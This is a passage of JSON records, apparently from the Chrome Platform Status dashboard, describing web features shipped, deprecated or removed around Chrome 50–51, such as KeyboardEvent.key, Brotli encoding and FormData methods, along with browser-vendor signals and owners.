    "comments": "The request by a web developer for FireFox to match Chrome's behavior raises some concern that people in fact are relying on this. \r\n\r\nIdeally this should be removed it because it interferes with the separation of Scrolling events from MouseWheel events. Right now mouse wheel events are conflated with scroll events; in preparation of passive event listeners for wheel we need to decouple them.",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=564042",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "When an iframe does not handle a mouse wheel event it is currently dispatched to the parent iframe. \r\n\r\nMouse wheel events are unique in this dispatching aspect and other vendors FireFox and Microsoft both don't dispatch the event to the parent iframe. This request is to make Chrome match FF and Edge.\r\n\r\nSome public discussion has happened on Fireכox's bug where a web developer asked Mozilla to implement similar behavior to chrome.",
    "id": 5678869528969216,
    "resources": {
      "docs": [
        "https://bugzilla.mozilla.org/show_bug.cgi?id=1084121"
      ],
      "samples": [
        "http://dtapuska.github.io/564042/iframe-scroll.html"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:48.449300",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove: OSX-specific appearances of <meter>",
    "tags": [
      "meter",
      "webkit"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 5
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "http://crbug.com/590129",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove the following -webkit-appearance values:\r\n -webkit-appearance: continuous-capacity-level-indicator\r\n -webkit-appearance: discrete-capacity-level-indicator\r\n -webkit-appearance: relevancy-level-indicator\r\n -webkit-appearance: rating-level-indicator\r\n",
    "id": 5658236371861504,
    "resources": {
      "docs": [
        "http://trac.webkit.org/wiki/Styling%20Form%20Controls",
        ""
      ]
    }
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-28 21:25:44.986280",
      "by": "ericbidelman@google.com"
    },
    "name": "Service Worker: remove URL.createObjectURL and URL.revokeObjectURL",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://w3c.github.io/FileAPI/",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": 51
        },
        "owners": [
          "jsbell@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "https://crbug.com/604951",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Per FileAPI:\r\nhttps://w3c.github.io/FileAPI/#creating-revoking\r\n\r\nchange: https://github.com/w3c/FileAPI/commit/b9c2275df53cf3a808f1f272f3d6134d1b920549\r\n\r\nURL.createObjectURL and URL.revokeObjectURL should not be exposed in Service Workers.",
    "id": 5685092332601344,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:30.634190",
      "by": "ericbidelman@google.com"
    },
    "name": "UIEvents KeyboardEvent |key| attribute",
    "comments": "IE's implementation does not completely match the current spec because it is based on an older version of the spec.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.w3.org/TR/DOM-Level-3-Events-key/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/key",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "garykac@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=227231",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "The KeyboardEvent |key| attribute contains information about the character being generated by the key event.",
    "id": 4748790720364544,
    "resources": {
      "docs": [
        "http://www.w3.org/TR/uievents/#interface-KeyboardEvent",
        "https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/key"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/keyboardevent-key-attribute/",
        "https://w3c.github.io/uievents/tools/key-event-viewer.html"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-26 16:34:05.687420",
      "by": "ericbidelman@google.com"
    },
    "name": "URL.searchParams readonly attribute",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://url.spec.whatwg.org/#dom-url-searchparams",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "sigbjornf@opera.com",
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "ios": 51,
        "blink_components": [
          "Blink>Network"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=303152",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Access the query portion of a URL by way of a URLSearchParams object.",
    "id": 5644164582604800,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams",
        "https://developer.mozilla.org/en-US/docs/Web/API/URL"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/urlsearchparams/index.html"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:49.373260",
      "by": "ericbidelman@google.com"
    },
    "name": "Web Animations JavaScript API [level 1 interop part 2]",
    "comments": "Builds on http://www.chromestatus.com/feature/4854343836631040 and http://www.chromestatus.com/feature/5650817352728576",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/web-animations/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1245000",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "shans@chromium.org",
          "dstockwell@chromium.org",
          "suzyh@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "http://crbug.com/257235",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "url": "http://status.modern.ie/webanimationsjavascriptapi",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=122912",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "A unified model for supporting animation and synchronization on the Web platform. This feature covers bug and interop fixes to bring Chrome in line with the spec: lists of values in keyframes; remove dashed-names as keys in keyframes.",
    "id": 5663463749713920,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:45.071910",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: OfflineAudioContext.length attribute",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "http://crbug.com/586595",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add a length attribute to an OfflineAudioContext that indicates the length (in frames) that the offline context will render.",
    "id": 5638204644392960,
    "resources": {
      "docs": [
        "https://github.com/WebAudio/web-audio-api/issues/690",
        "https://github.com/WebAudio/web-audio-api/pull/691"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:28:40.776790",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "Accept-encoding: br on HTTPS connection",
    "tags": [
      "compression"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tools.ietf.org/html/draft-alakuijala-brotli",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=366559",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 50
        },
        "owners": [
          "kenjibaheux@chromium.org",
          "eustas@chromium.org",
          "jyrki@google.com",
          "szabadka@google.com",
          "lode@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 50,
        "ios": 50,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "http://crbug.com/452335",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "url": "https://wpdev.uservoice.com/forums/257854-microsoft-edge-developer/suggestions/11364771-brotli-accept-encoding-content-encoding",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Brotli (shortname \"br\") is used in WOFF 2.0 web fonts with great success.\r\n\r\nThis is about making it available as an HTTP content-encoding method (e.g. Accept-Encoding: br).\r\n\r\nAdvantages of Brotli over gzip:\r\n - significantly better compression density\r\n - comparable decompression speed",
    "id": 5420797577396224,
    "resources": {
      "samples": [
        "https://github.com/google/brotli"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2017-06-14 18:28:48.706060",
      "by": "ericbidelman@google.com"
    },
    "name": "Access relative and absolute orientation sensors from Chrome for Android for Virtual and Augmented Reality",
    "tags": [
      "vr",
      "ag"
    ],
    "comments": "'deviceorientationabsolute' events have been added to accommodate developers requiring absolute orientation e.g. for AR applications. To the best of our knowledge this event has not shipped in other browsers.",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://w3c.github.io/deviceorientation/spec-source-orientation.html",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 50
        },
        "owners": [
          "timvolodine@chromium.org",
          "smus@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 50,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "http://crbug.com/520546",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "http://www.html5rocks.com/en/tutorials/device/orientation/",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Summarized this feature includes the following changes/additions:\r\n- make 'deviceorientation' relative by default\r\n  -- now compatible with Safari on iOS,\r\n  -- better usability (no drift) for VR applications,\r\n  -- not reliant on magnetometer hence no interference in the presence of magnetic fields.\r\n- add dedicated 'deviceorientationabsolute' event for AR applications.\r\n",
    "id": 5661106970296320,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/03/device-orientation-changes",
        "https://goo.gl/4TD4xV",
        "https://docs.google.com/document/d/1NaXxW5zxB9-RamaL9jx3e_msao-GGrvTnfXJpusWf84/edit#",
        "https://github.com/w3c/deviceorientation/issues/21"
      ],
      "samples": [
        "https://timvolodine.github.io/deviceorientation-test/",
        "http://jsbin.com/device-inertial-sensor-diagnostics"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:13.013340",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS column-fill property",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://drafts.csswg.org/css-multicol-1/#filling-columns",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 50
        },
        "owners": [
          "mstensho@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=492297",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "column-fill is the one missing CSS property from the multicol spec (not counting break-after, break-before or break-inside, which really belong in a more generic spec for fragmentation). This property is used to tell the engine whether columns should be balanced or not. If they are balanced, each column gets similar amounts of content inside. If they are not balanced, each column will be filled to the height of the multicol container, until we run out of content.",
    "id": 6298909664083968,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:28.927560",
      "by": "ericbidelman@google.com"
    },
    "name": "DOMTokenList validation",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://dom.spec.whatwg.org/#concept-supported-tokens",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/whatwg/dom/issues/106",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 50
        },
        "owners": [
          "yoav@yoav.ws"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 50,
        "ios": 50,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "https://crbug.com/557597",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "DOMTokenList has a \"supported tokens\" concept which will enable feature detection of things like sandbox flags and link relations.",
    "id": 4663631736209408,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/03/domtokenlist-validation-added-in-chrome-50",
        "https://developer.mozilla.org/en-US/docs/Web/API/DOMTokenList/supports"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:16.327970",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate and Remove: -webkit-background-composite",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 5
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 50
        },
        "owners": [
          "nainar@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "bug": "http://crbug.com/498588",
        "intervention": false
      },
      "opera": {
        "android": 37
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Removing -webkit-background-composite as the property is non-standard and supported only by WebKit and Blink.",
    "id": 6607299456008192,
    "resources": {}
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2018-02-14 21:59:28.632570",
      "by": "jmedley@google.com"
    },
    "name": "Deprecate and remove some nonstandard uses of RTCPeerConnection legacy methods.",
    "comments": "See also crbug.com/564530",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/webrtc-pc",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 50
        },
        "owners": [
          "guidou@chromium.org",
          "hta@chromium.org"
        ],
        "prefixed": true,
        "origintrial": false,
        "webview": 50,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "https://crbug.com/564579",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The latest version of the WebRTC spec introduces new promise-based methods for the RTCPeerConnection interface while keeping support for legacy callback-based methods. \r\n\r\nSome nonstandard uses of the legacy methods prevent the implementation of the new promise-based methods due to overloading conflicts and they are now deprecated. More specifically, calling createOffer() and createAnswer() without providing a failure callback (mandatory in the spec, but optional in Chromium) is now deprecated.",
    "id": 5663288008376320,
    "resources": {
      "docs": [
        "https://w3c.github.io/webrtc-pc/#legacy-interface-extensions",
        "https://developer.mozilla.org/en-US/docs/Web/API/RTCPeerConnection/createOffer",
        "https://developer.mozilla.org/en-US/docs/Web/API/RTCPeerConnection/createAnswer"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-06-14 18:29:16.080810",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate/remove <link rel=subresource>",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 50
        },
        "owners": [
          "yoav@yoav.ws"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 50,
        "ios": 50,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=581840",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove support for the \"subresource\" rel of HTMLLinkElement, as it is not useful, proprietary, and buggy. \r\n",
    "id": 6596598008119296,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/03/link-rel-preload"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:29:11.980000",
      "by": "ericbidelman@google.com"
    },
    "name": "Document.defaultCharset",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/whatwg/dom/issues/58#issuecomment-162481999",
          "text": "Opposed",
          "val": 7
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 50
        },
        "owners": [
          "philipj@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 50,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "https://crbug.com/567738",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The defaultCharset attribute on the Document interface is non-standard and will be removed.",
    "id": 6217124578066432,
    "resources": {
      "docs": [
        "https://github.com/whatwg/dom/issues/58"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:55.537060",
      "by": "ericbidelman@google.com"
    },
    "name": "FormData methods for inspection and modification",
    "tags": [
      "FormData"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://xhr.spec.whatwg.org/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/FormData",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 50
        },
        "owners": [
          "jsbell@chromium.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 50,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "https://crbug.com/412991",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "The FormData object allows pages to programmatically construct a list of key/value entries that can be submitted via XHR just like an HTML form. Previously, the object was write-only via a single append() method.\r\n\r\nThe spec was fleshed out to add has(), get(), getAll(), delete(), set(), entries(), keys(), values(), forEach() and Symbol.iterator() methods to allow inspection, iteration and modification.\r\n",
    "id": 5701572055007232,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/FormData",
        "https://developers.google.com/web/updates/2016/03/formdata-methods-for-inspection-and-modification"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/formdata-methods/index.html"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:27.342690",
      "by": "ericbidelman@google.com"
    },
    "name": "HTMLCanvasElement toBlob",
    "comments": "Developers have been looking forward to this functionality for a long time: http://stackoverflow.com/questions/6736023/which-browsers-and-versions-support-the-canvas-toblob-method",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://html.spec.whatwg.org/multipage/scripting.html#dom-canvas-toblob",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=648610",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 50
        },
        "owners": [
          "xlai@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 50,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=67587",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "url": "https://msdn.microsoft.com/en-us/library/hh771732(v=vs.85).aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Creates a Blob object representing a file containing the image in the canvas, and invokes a callback with a handle to that object.",
    "id": 4562033294966784,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/03/canvas-toblob-in-chrome-50",
        "https://developer.mozilla.org/en-US/docs/Web/API/HTMLCanvasElement/toBlob"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-08-29 14:56:52.333520",
      "by": "mlamouri@chromium.org"
    },
    "name": "HTMLMediaElement.play() returns a promise",
    "tags": [
      "audio",
      "video",
      "media",
      "play"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/multipage/embedded-content.html#dom-media-play",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1244768",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 50
        },
        "owners": [
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 50,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "https://crbug.com/579541",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/whatwg/html/issues/505#issuecomment-170947507",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This is allowing a simpler flow to know whether playback started or whether it failed. It also allows the UA to reject the promise if playback is not allowed in the current context, solving issues websites have to detect whether autoplay restrictions blocked the playback.",
    "id": 5920584248590336,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/03/play-returns-promise"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/play-return-promise/index.html"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-11-22 18:04:06.217690",
      "by": "ericbidelman@google.com"
    },
